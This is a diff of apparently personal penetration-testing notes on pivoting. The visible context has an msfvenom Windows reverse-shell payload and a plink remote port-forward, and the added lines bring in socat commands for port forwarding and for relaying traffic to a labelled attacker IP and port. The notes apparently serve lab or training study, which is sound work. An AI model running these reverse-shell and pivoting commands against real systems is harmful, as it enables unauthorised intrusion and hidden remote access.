@@ -577,7 +577,9 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.205.128 LPORT=4444 EXITFUNC=
 
 
 
-# Pivoting
+# Pivoting 
+https://exploit-notes.hdks.org/exploit/network/port-forwarding/port-forwarding-with-socat/#port-forwarding-(from-remote-machine)
+
 
 
 ## Pivoting using SSH and Proxychains
@@ -624,4 +626,16 @@ cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFI
 - rarely installed by default on a target
 - Windows version is unlikely to bypass Antivirus software by default, so custom compilation may be required
 
+
+Port Forwarding
+```
+socat tcp-listen:8080,fork tcp:<remote-ip>:80
+```
+
+
+Reverse
+```
+ ./socat-sardarji  tcp-l:8000 tcp:10.50.106.240:4444 &
+socat linux binary  machine port       attacker IP and port
+```
 
